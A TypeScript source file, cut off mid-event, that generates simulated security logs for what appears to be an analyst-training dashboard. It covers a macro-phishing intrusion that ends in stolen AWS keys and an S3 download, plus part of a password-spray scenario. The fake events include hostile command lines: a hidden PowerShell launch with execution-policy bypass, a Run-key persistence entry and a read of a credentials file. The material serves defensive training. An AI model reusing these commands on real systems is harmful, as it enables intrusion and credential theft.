/**
 * Events-only half of the live-feed scenarios in ./scenarios.ts.
 *
 * The dashboard's live feed runs in the browser (attackStories.ts), so what it
 * imports ships in a public /_next/static chunk. The answer key (questions,
 * answers, explanations, IOCs, killchain, narrative) stays in the builder in
 * ./scenarios.ts, which composes this module on the server. Keep anything
 * answer-bearing out of this file: every visitor can read it.
 */
import type { TelemetryEvent } from "./types";
import { makeSha256 } from "./iocs";

/** Telemetry half of `buildPhishingToExfil`: the events and the story title, no answer key. */
export function phishingToExfilEvents() {
  const B = new Date("2026-05-08T09:42:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim   = { hostname: "WS-FIN-2847", email: "j.smith@nexacorp.com",   ip: "10.10.20.14" };
  const c2Domain = "cdn-update-fb76.xyz";
  const c2Ip     = "185.134.140.139";
  // Story-specific infrastructure (not shared with bec / oauth).
  const attackerIp = "193.42.33.71";
  const senderIp   = "141.98.11.54";
  const dllHash  = makeSha256("svchost32_lockbit_loader");

  const events: TelemetryEvent[] = [
    {
      id: "evt_01_logon", ts: T(0),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "informational",
      description: "j.smith logged on to WS-FIN-2847 from the office network during working hours.",
      raw: {
        // Windows Security Event 4624 — Successful Logon
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "WS-FIN-2847",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1048297",
        // Subject (the process requesting logon — SYSTEM on interactive logons)
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": "WS-FIN-2847$",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        // New Logon (the account that was logged on)
        "winlog.event_data.TargetUserSid": "S-1-5-21-3421479547-3897544621-1789562108-1103",
        "winlog.event_data.TargetUserName": "jsmith",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetLogonId": "0x8F4A21",
        "winlog.event_data.LogonGuid": "{A1B2C3D4-E5F6-A1B2-C3D4-E5F6A1B2C3D4}",
        // Logon type and process
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": "WS-FIN-2847",
        "winlog.event_data.TransmittedServices": "-",
        "winlog.event_data.LmPackageName": "-",
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.ImpersonationLevel": "%%1833",
        "winlog.event_data.ElevatedToken": "%%1843",
        // Network / process
        "winlog.event_data.IpAddress": "10.10.20.14",
        "winlog.event_data.IpPort": "0",
        "winlog.event_data.ProcessId": "0x44C",
        "winlog.event_data.ProcessName": "C:\\Windows\\System32\\winlogon.exe",
        // ECS fields
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "event.created": "2026-05-08T09:42:00.000Z",
        "user.name": "NEXACORP\\jsmith",
        "user.domain": "NEXACORP",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1103",
        "host.name": "WS-FIN-2847",
        "source.ip": "10.10.20.14",
        "authentication.protocol": "Kerberos",
        "authentication.status": "success",
        "logon.type": "2",
      },
    },
    {
      id: "evt_02_phish_email", ts: T(5 * MIN),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email, src_ip: senderIp,
      severity: "high", mitre_technique: "T1566.001",
      description: "j.smith received an email with a macro-enabled Word attachment (Invoice_Q3_Final.docm) from nexacorp-vendor.xyz. SPF, DKIM, and DMARC all failed; a transport rule allowed delivery.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "email.from.address": "support@nexacorp-vendor.xyz",
        "email.to.address": "j.smith@nexacorp.com",
        "email.subject": "Invoice Q3 Final — Action Required",
        "email.attachment.name": "Invoice_Q3_Final.docm",
        "email.direction": "inbound",
        "file.size": "47293",
        "source.ip": senderIp,
        "spf.result": "fail", "dkim.result": "fail", "dmarc.result": "fail",
        // Delivered clean: an allow-rule override delivers without a malware
        // verdict (MDO never shows Malware + Delivered on one row).
        "action_result": "delivered",
        "delivery.override": "Transport rule allow — keyword match: invoice",
      },
    },
    {
      id: "evt_03_macro_open", ts: T(5 * MIN + 30_000),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
      user_email: victim.email, hostname: victim.hostname,
      severity: "high",
      process: {
        name: "WINWORD.EXE", pid: 4128, parent_name: "explorer.exe", parent_pid: 3280,
        cmdline: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\jsmith\\Downloads\\Invoice_Q3_Final.docm\"",
        user: "NEXACORP\\jsmith", integrity: "medium",
      },
      description: "j.smith opened Invoice_Q3_Final.docm on WS-FIN-2847; WINWORD.EXE launched with the macro's Trust Center warning dismissed moments before it spawned PowerShell.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-08 09:47:30.118",
        "winlog.event_data.ProcessGuid": "{a1b2c3d4-e5f6-a1b2-0002-c3d4e5f60002}",
        "winlog.event_data.ProcessId": "4128",
        "winlog.event_data.Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "winlog.event_data.CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\jsmith\\Downloads\\Invoice_Q3_Final.docm\"",
        "winlog.event_data.ParentImage": "C:\\Windows\\explorer.exe",
        "winlog.event_data.ParentProcessId": "3280",
        "winlog.event_data.ParentCommandLine": "C:\\Windows\\Explorer.EXE",
        "winlog.event_data.User": "NEXACORP\\jsmith",
        "winlog.event_data.IntegrityLevel": "Medium",
        "winlog.event_data.Company": "Microsoft Corporation",
        "winlog.event_data.Product": "Microsoft Office",
      },
    },
    {
      id: "evt_04_powershell", ts: T(5 * MIN + 31_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "critical", mitre_technique: "T1059.001",
      description: "WINWORD.EXE on WS-FIN-2847 spawned a hidden PowerShell process with execution policy bypass, running a script from jsmith's Temp folder.",
      process: {
        name: "powershell.exe", pid: 5512, parent_name: "WINWORD.EXE", parent_pid: 4128,
        cmdline: "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\jsmith\\AppData\\Local\\Temp\\inv_q3.ps1",
        user: "NEXACORP\\jsmith", integrity: "medium",
      },
      raw: {
        // CrowdStrike Falcon — detection metadata
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.id": "ldt:bf21870142a4e34a535af46f5b8bcfd7:1234567891",
        "crowdstrike.detection.description": "Suspicious PowerShell child process spawned by Microsoft Word with Base64-encoded command and execution policy bypass. Consistent with macro-delivered stage-1 loader.",
        "crowdstrike.detection.scenario": "suspicious_process_from_document",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.pattern_id": "11901",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.objective": "Keep Access",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.sensor.id": "97f45e3afc637a1614ec711f50bb1286",
        "crowdstrike.customer_id": "a214f4f4fa1ab768a188dd17a1c89e85",
        "crowdstrike.sensor.version": "7.08.17410.0",
        "crowdstrike.network_containment_state": "Not Contained",
        "crowdstrike.tree_id": "57fe9cc432b4a165e5acbc776956a726",
        "crowdstrike.detection.link": "https://falcon.crowdstrike.com/activity/detections/detail/bf21870142a4e34a535af46f5b8bcfd7/1234567891",
        // Event
        "event.created": "2026-05-08T09:47:31.000Z",
        "event.action": "process_created",
        // Process — powershell.exe
        "process.pid": "5512",
        "process.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.name": "powershell.exe",
        "process.command_line": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\jsmith\\AppData\\Local\\Temp\\inv_q3.ps1",
        "process.hash.sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1848474f30",
        "process.hash.md5": "7353f60b1739074eb17c5f4dddefe239",
        "process.integrity_level": "MEDIUM_INTEGRITY_LEVEL",
        "process.token_type": "TokenPrimary",
        "process.session_id": "1",
        // Parent — WINWORD.EXE
        "process.parent.pid": "4128",
        "process.parent.name": "WINWORD.EXE",
        "process.parent.executable": "\\Device\\HarddiskVolume3\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "process.parent.command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\jsmith\\Downloads\\Invoice_Q3_Final.docm\"",
        "process.parent.hash.sha256": "88fa52d1122deaf6437d901edeec041b767562964c57f321c61599326ab119d0",
        // Grandparent — explorer.exe
        "process.grandparent.name": "explorer.exe",
        "process.grandparent.pid": "3280",
        "process.grandparent.executable": "\\Device\\HarddiskVolume3\\Windows\\explorer.exe",
        // User
        "user.name": "NEXACORP\\jsmith",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1103",
        // Host
        "host.name": "WS-FIN-2847",
        "host.ip": "10.10.20.14",
        "host.mac": "00-0C-29-AB-CD-EF",
        "host.os.name": "Windows 10 Pro",
        "host.os.version": "22H2",
        "host.os.build": "19045.4291",
        // Threat mapping
      },
    },
    // ── First alert: the EDR detection on the Office → PowerShell parent/child pair ──
    {
      id: "evt_phish_edr_alert", ts: T(5 * MIN + 33_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "edr_alert",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1059.001", is_detection: true,
      process: {
        name: "powershell.exe", pid: 5512, parent_name: "WINWORD.EXE", parent_pid: 4128,
        cmdline: "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\jsmith\\AppData\\Local\\Temp\\inv_q3.ps1",
        user: "NEXACORP\\jsmith", integrity: "medium",
      },
      description: "Falcon raised a High detection on WS-FIN-2847: WINWORD.EXE launched a hidden powershell.exe with execution policy bypass. Disposition: detection only, process not stopped.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.detection.name": "OfficeAppSpawnsScriptInterpreter",
        "crowdstrike.detection.description": "A Microsoft Office application launched PowerShell with a hidden window and execution policy bypass.",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.process_tree": "explorer.exe > WINWORD.EXE > powershell.exe",
        "crowdstrike.sensor.id": "97f45e3afc637a1614ec711f50bb1286",
        "crowdstrike.network_containment_state": "Not Contained",
        "event.action": "alert",
        "process.pid": "5512",
        "process.parent.pid": "4128",
        "user.name": "NEXACORP\\jsmith",
        "host.name": "WS-FIN-2847",
        "host.ip": "10.10.20.14",
      },
    },
    // ── CORRELATED: DNS query for C2 domain just before beacon ────────────────────
    {
      id: "evt_phish_dns_c2", ts: T(5 * MIN + 42_000),
      source: "sysmon", vendor: "Microsoft Sysmon",
      event_type: "dns_query", severity: "high",
      hostname: victim.hostname, src_ip: victim.ip,
      mitre_technique: "T1071.001",
      description: `WS-FIN-2847 resolved ${c2Domain}, a domain registered 3 days ago.`,
      raw: {
        "event.code": "22",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-08 09:47:42.203",
        "winlog.event_data.ProcessGuid": "{a1b2c3d4-e5f6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ProcessId": "5512",
        "winlog.event_data.QueryName": c2Domain,
        "winlog.event_data.QueryStatus": "0",
        "winlog.event_data.QueryResults": `type: 1 ${c2Ip};`,
        "winlog.event_data.Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "host.name": victim.hostname,
      },
    },

    // ── CORRELATED: the internal resolver's own record of the same lookup ─────────
    {
      id: "evt_phish_dns_server", ts: T(5 * MIN + 42_000),
      source: "dns", vendor: "Windows DNS Server",
      event_type: "dns_query", severity: "medium",
      hostname: victim.hostname, src_ip: victim.ip,
      dns: { query: c2Domain, query_type: "A", rcode: "NOERROR" },
      description: `The internal DNS server answered ${victim.hostname}'s A query for ${c2Domain} with ${c2Ip}.`,
      raw: { "dns.question.name": c2Domain, "dns.question.type": "A",
             "dns.response_code": "NOERROR", "dns.resolved_ip": c2Ip,
             "source.ip": victim.ip },
    },

    // ── CORRELATED: Firewall event — PowerShell connecting to C2 IP ───────────────
    {
      id: "evt_phish_fw_c2", ts: T(5 * MIN + 46_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection", severity: "high",
      mitre_technique: "T1071.001",
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443,
      hostname: victim.hostname,
      description: `WS-FIN-2847 opened an outbound HTTPS connection to ${c2Ip} — the resolved IP for the newly-seen domain.`,
      raw: {
        "event.action": "allow",
        "source.ip": victim.ip,
        "destination.ip": c2Ip,
        "destination.port": "443",
        "pan.app": "ssl",
        "pan.action": "allow",
        "pan.rule": "ALLOW-OUTBOUND-HTTPS",
        "threat.category": "CommandAndControl",
        "url.category": "Unknown",
        "network.bytes_out": "1240",
        "network.bytes_in": "4096",
        "action_result": "allow",
      },
    },
    {
      id: "evt_06_dll_drop", ts: T(8 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email,
      severity: "high", mitre_technique: "T1027",
      file: { path: "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.dll", sha256: dllHash, size: 143360 },
      description: "powershell.exe wrote an unsigned DLL named svchost32.dll to jsmith's Temp folder on WS-FIN-2847.",
      raw: {
        // CrowdStrike Falcon — detection metadata
        "crowdstrike.event_simpleName": "NewExecutableWritten",
        "crowdstrike.detection.id": "ldt:bf21870142a4e34a535af46f5b8bcfd7:1234567892",
        "crowdstrike.detection.description": "Unsigned DLL with high entropy (7.8) written to user Temp directory by PowerShell. File name mimics Windows system binary (svchost). Zero global prevalence. Consistent with payload dropper activity.",
        "crowdstrike.detection.scenario": "malicious_dropper_file_write",
        "crowdstrike.detection.tactic": "Defense Evasion",
        "crowdstrike.detection.tactic_id": "TA0005",
        "crowdstrike.detection.technique": "Obfuscated Files or Information",
        "crowdstrike.detection.technique_id": "T1027",
        "crowdstrike.detection.pattern_id": "52001",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.objective": "Keep Access",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.sensor.id": "97f45e3afc637a1614ec711f50bb1286",
        "crowdstrike.customer_id": "a214f4f4fa1ab768a188dd17a1c89e85",
        "crowdstrike.sensor.version": "7.08.17410.0",
        "crowdstrike.network_containment_state": "Not Contained",
        "crowdstrike.tree_id": "57fe9cc432b4a165e5acbc776956a726",
        "crowdstrike.detection.link": "https://falcon.crowdstrike.com/activity/detections/detail/bf21870142a4e34a535af46f5b8bcfd7/1234567892",
        // Event
        "event.code": "NewExecutableWritten",
        "event.action": "file_created",
        "event.created": "2026-05-08T09:50:00.412Z",
        // File
        "file.path": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.dll",
        "file.name": "svchost32.dll",
        "file.extension": ".dll",
        "file.size": "143360",
        "file.type": "DLL",
        "file.created": "2026-05-08T09:50:00.412Z",
        "file.hash.sha256": dllHash,
        "file.hash.md5": "9269929cbaf1c676b7acd2e3e45497f1",
        // PE metadata
        "pe.original_filename": "(not present)",
        "pe.company_name": "(not present)",
        "pe.description": "(not present)",
        "pe.signed": "false",
        "pe.imphash": "f34d5f2d2d15c7c3e4f6b1a2d3c4e5f6",
        "pe.entropy": "7.8",
        "pe.compile_time": "2026-05-07T22:14:36Z",
        "pe.first_seen_globally": "never",
        "pe.prevalence": "1 of 1 (unique, not seen before in telemetry)",
        // Writing process — powershell.exe
        "process.name": "powershell.exe",
        "process.pid": "5512",
        "process.executable": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\jsmith\\AppData\\Local\\Temp\\inv_q3.ps1",
        "process.hash.sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1848474f30",
        // User
        "user.name": "NEXACORP\\jsmith",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1103",
        // Host
        "host.name": "WS-FIN-2847",
        "host.ip": "10.10.20.14",
        "host.os.name": "Windows 10 Pro",
        "host.os.version": "22H2",
        "host.os.build": "19045.4291",
        // ML risk score
        // Threat mapping
        "threat.category": "Dropper",
      },
    },
    {
      id: "evt_07_reg_persist", ts: T(8 * MIN + 20_000),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "registry_set",
      hostname: victim.hostname, user_email: victim.email,
      severity: "high", mitre_technique: "T1547.001",
      description: "PowerShell set an HKCU Run value named WindowsUpdater on WS-FIN-2847 that launches rundll32.exe against svchost32.dll.",
      raw: {
        "event.code": "13",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-08 09:50:20.118",
        "winlog.event_data.EventType": "SetValue",
        "winlog.event_data.ProcessGuid": "{a1b2c3d4-e5f6-a1b2-0001-c3d4e5f60001}",
        "winlog.event_data.ProcessId": "5512",
        "winlog.event_data.Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "winlog.event_data.TargetObject": "HKU\\S-1-5-21-3421479547-3897544621-1789562108-1103\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdater",
        "winlog.event_data.Details": "rundll32.exe C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost32.dll,DllMain",
        "winlog.event_data.User": "NEXACORP\\jsmith",
      },
    },
    // ── One goal: the AWS key on this workstation → the S3 export bucket ────
    // (2026-10-02 review: the LSASS dump, RC4 TGT, SMB hop, Entra sign-in and
    // inbox rule were three unconnected goals; they were cut so every row below
    // leads to the S3 download.) The same PowerShell process (PID 5512) that
    // resolved the new domain reads the CLI profile; the key it holds is then
    // used from outside, and the access key id threads 11c → 12.
    {
      id: "evt_11b_aws_profile_read", ts: T(38 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_access",
      hostname: victim.hostname, user_email: victim.email,
      severity: "high", mitre_technique: "T1552.001",
      process: { name: "powershell.exe", pid: 5512, parent_name: "WINWORD.EXE", parent_pid: 4128, user: "NEXACORP\\jsmith", integrity: "medium" },
      file: { path: "C:\\Users\\jsmith\\.aws\\credentials", size: 217 },
      description: `powershell.exe (PID 5512) on ${victim.hostname} opened C:\\Users\\jsmith\\.aws\\credentials.`,
      raw: {
        "crowdstrike.event_simpleName": "FileOpenInfo",
        "crowdstrike.FileName": "credentials",
        "crowdstrike.FilePath": "C:\\Users\\jsmith\\.aws\\",
        "crowdstrike.process_name": "powershell.exe",
        "crowdstrike.RawProcessId": "5512",
        "crowdstrike.UserName": "NEXACORP\\jsmith",
        "file.path": "C:\\Users\\jsmith\\.aws\\credentials",
        "file.size": 217,
        "event.action": "FileOpenInfo",
        "event.outcome": "success",
      },
    },
    {
      id: "evt_11c_sts_identity", ts: T(40 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1078.004",
      description: `GetCallerIdentity was called with access key AKIA4XJ9PQ2M7EXAMPLE from ${attackerIp}.`,
      raw: {
        "aws.cloudtrail.eventName": "GetCallerIdentity",
        "aws.cloudtrail.eventSource": "sts.amazonaws.com",
        "aws.cloudtrail.userIdentity.type": "IAMUser",
        "aws.cloudtrail.userIdentity.userName": "jsmith-analytics",
        "aws.cloudtrail.userIdentity.accessKeyId": "AKIA4XJ9PQ2M7EXAMPLE",
        "aws.cloudtrail.sourceIPAddress": attackerIp,
        "aws.cloudtrail.userAgent": "aws-cli/2.13.25 Python/3.11.6 Windows/10",
        "aws.cloudtrail.awsRegion": "eu-west-1",
        "event.outcome": "success",
      },
    },
    {
      id: "evt_12_s3_exfil", ts: T(43 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: attackerIp,
      // T1530 Data from Cloud Storage: a GetObject against the victim's own
      // bucket (T1567.002 is an upload TO an attacker's cloud storage).
      severity: "critical", mitre_technique: "T1530",
      network: { bytes_out: 184_000_000 },
      description: `Access key AKIA4XJ9PQ2M7EXAMPLE (jsmith-analytics) read exports/customer-financial-data-2026.zip (184 MB) from bucket nexacorp-crm-exports, from ${attackerIp}.`,
      raw: {
        "event.action": "GetObject", "event.outcome": "success",
        "aws.cloudtrail.requestParameters.bucketName": "nexacorp-crm-exports",
        "aws.cloudtrail.requestParameters.key": "exports/customer-financial-data-2026.zip",
        "aws.cloudtrail.sourceIPAddress": attackerIp,
        "aws.cloudtrail.awsRegion": "eu-west-1",
        // Field names aligned to eventName/eventSource, matching the two
        // CloudTrail events that now precede this one — the same scenario was
        // using snake_case here and camelCase there.
        "aws.cloudtrail.eventName": "GetObject",
        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
        // The access key is what closes the pivot: same key as evt_11c, read
        // off disk in evt_11b. Without it the analyst could see the download
        // but never establish WHICH credential performed it.
        "aws.cloudtrail.userIdentity.type": "IAMUser",
        "aws.cloudtrail.userIdentity.userName": "jsmith-analytics",
        "aws.cloudtrail.userIdentity.accessKeyId": "AKIA4XJ9PQ2M7EXAMPLE",
        "aws.s3.bucket.name": "nexacorp-crm-exports",
        "storage.object.name": "exports/customer-financial-data-2026.zip",
        "network.bytes_out": "184000000",
        "cloud.provider": "aws", "cloud.region": "eu-west-1",
        "source.ip": attackerIp,
        "user.name": "jsmith-analytics",
        "user_agent.original": "aws-cli/2.13.25 Python/3.11.6 Windows/10",
      },
    },

    // ── CORRELATED: Baseline — j.smith normal morning Okta login from Israel ─────
    // (the account's normal location, to contrast with 11c/12's source IP)
    {
      id: "evt_phish_baseline_01", ts: T(-30 * MIN), is_baseline: true,
      source: "okta", vendor: "Okta",
      event_type: "auth_success", severity: "informational",
      user_email: victim.email,
      src_ip: "185.64.44.22",
      description: "j.smith logged in to Okta from Tel Aviv on a registered device.",
      raw: {
        "okta.eventType": "user.session.start",
        "okta.outcome.result": "SUCCESS",
        "okta.actor.login": victim.email,
        "okta.client.ipAddress": "185.64.44.22",
        "okta.client.geographicalContext.country": "IL",
        "okta.client.geographicalContext.city": "Tel Aviv",
        "okta.authenticationContext.authType": "PASSWORD_IDP",
        "okta.risk.level": "LOW",
        "GeoLocation.country_name": "Israel",
        "GeoLocation.city_name": "Tel Aviv",
        "GeoLocation.location.lat": 32.0853,
        "GeoLocation.location.lon": 34.7818,
        "event.action": "logged-in", "event.outcome": "success",
        "source.ip": "185.64.44.22",
        "user.email": victim.email,
      },
    },
  ];

  return { title: "Phishing Macro → AWS Key Theft → S3 Download", events, T, MIN, victim, c2Domain, c2Ip, attackerIp, senderIp, dllHash };
}

/** Telemetry half of `buildBecScenario`: the events and the story title, no answer key. */
export function becScenarioEvents() {
  const B = new Date("2026-05-08T08:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim      = { hostname: "LAPTOP-FIN-04", email: "l.harris@nexacorp.com", ip: "10.10.30.21" };
  // Story-specific infrastructure (not shared with phishing / oauth).
  const attackerIp  = "77.83.247.146";
  const sprayIp     = "158.131.159.30";
  const adfsIp      = "10.10.1.15";

  const events: TelemetryEvent[] = [
    // The spray hits the internet-facing AD FS farm, not a DC: the AD FS server
    // validates each password itself and writes the 4625 locally (caller =
    // the AD FS service host, no client IP — that lives in the firewall row
    // and AD FS audit 411). One representative record of the burst.
    {
      id: "evt_01_spray", ts: T(0),
      source: "ad", vendor: "Windows Security", event_type: "auth_failure",
      hostname: "SRV-ADFS01",
      severity: "high", mitre_technique: "T1110.003",
      description: "SRV-ADFS01 logged a failed logon (bad password) for l.harris through the AD FS service — one of a burst of failures for different accounts that began at 08:00.",
      raw: {
        // Windows Security Event 4625 — Failed Logon, logged on the AD FS server
        "winlog.event_id": "4625",
        "winlog.channel": "Security",
        "winlog.computer_name": "SRV-ADFS01",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1048301",
        // Subject (no authenticated subject for failed logons from external)
        "winlog.event_data.SubjectUserSid": "S-1-0-0",
        "winlog.event_data.SubjectUserName": "-",
        "winlog.event_data.SubjectDomainName": "-",
        // Target (representative account from the spray)
        "winlog.event_data.TargetUserSid": "S-1-0-0",
        "winlog.event_data.TargetUserName": "l.harris",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        // Failure reason — %%2313 = "Unknown user name or bad password" (the string
        // Windows writes for SubStatus 0xC000006A; %%2312 is "User not allowed to logon at this computer")
        "winlog.event_data.Status": "0xC000006D",
        "winlog.event_data.SubStatus": "0xC000006A",
        "winlog.event_data.FailureReason": "%%2313",
        // Logon details — AD FS forms auth calls LogonUser from its service host
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.LogonProcessName": "Advapi  ",
        "winlog.event_data.AuthenticationPackageName": "Negotiate",
        "winlog.event_data.WorkstationName": "SRV-ADFS01",
        "winlog.event_data.ProcessName": "C:\\Windows\\ADFS\\Microsoft.IdentityServer.ServiceHost.exe",
        "winlog.event_data.IpAddress": "-",
        "winlog.event_data.IpPort": "-",
        // ECS fields
        "event.code": "4625",
        "event.action": "logon-failed",
        "event.outcome": "failure",
        "event.created": "2026-05-08T08:00:00.000Z",
        "host.name": "SRV-ADFS01",
        "authentication.status": "failure",
        "authentication.failure_reason": "wrong_password",
        "logon.type": "3",
      },
    },
    // ── CORRELATED: Firewall — spray IP connection volume to ADFS proxy port 443 ─
    {
      id: "evt_bec_fw_spray", ts: T(0),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection", severity: "high",
      mitre_technique: "T1110.003",
      src_ip: sprayIp, dst_ip: adfsIp, dst_port: 443,
      description: `The firewall logged 47 inbound HTTPS connections from ${sprayIp} to the ADFS extranet proxy (adfs.nexacorp.com) in 4 minutes.`,
      raw: {
        "event.action": "allow",
        "source.ip": sprayIp,
        "destination.ip": "10.10.1.15",
        "destination.port": "443",
        "destination.host": "adfs.nexacorp.com",
        "pan.app": "ms-adfs",
        "pan.action": "allow",
        "pan.rule": "ALLOW-INBOUND-ADFS",
        "source.geo.country_name": "Netherlands",
        "source.geo.city_name": "Amsterdam",
        "threat.category": "BruteForce",
      },
    },
    {
      id: "evt_02_lockout_1", ts: T(1 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_failure",
      user_email: "a.nelson@nexacorp.com", hostname: "DC01",
      severity: "medium",
      description: "DC01 locked out account a.nelson; the caller computer was SRV-ADFS01.",
      raw: {
        // Windows Security Event 4740 — Account Locked Out
        "winlog.event_id": "4740",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1048302",
        // Subject (SYSTEM on DC)
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": "DC01$",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        // Target account that was locked out
        "winlog.event_data.TargetUserName": "a.nelson",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetSid": "S-1-5-21-3421479547-3897544621-1789562108-1104",
        // Machine that triggered the lockout
        "winlog.event_data.CallerComputerName": "SRV-ADFS01",
        // ECS fields
        "event.code": "4740",
        "event.action": "account-locked-out",
        "event.outcome": "failure",
        "event.created": "2026-05-08T08:01:00.000Z",
        "user.name": "a.nelson",
        "user.domain": "NEXACORP",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1104",
        "host.name": "DC01",
        "account.locked": "true",
        "authentication.failure_reason": "0xC0000234 — Account Locked Out (too many failed attempts)",
      },
    },
    {
      id: "evt_03_lockout_2", ts: T(2 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_failure",
      user_email: "r.garcia@nexacorp.com", hostname: "DC01",
      severity: "medium",
      description: "DC01 locked out account r.garcia one minute after a.nelson; the caller computer was again SRV-ADFS01.",
      raw: {
        // Windows Security Event 4740 — Account Locked Out
        "winlog.event_id": "4740",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1048315",
        // Subject (SYSTEM on DC)
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": "DC01$",
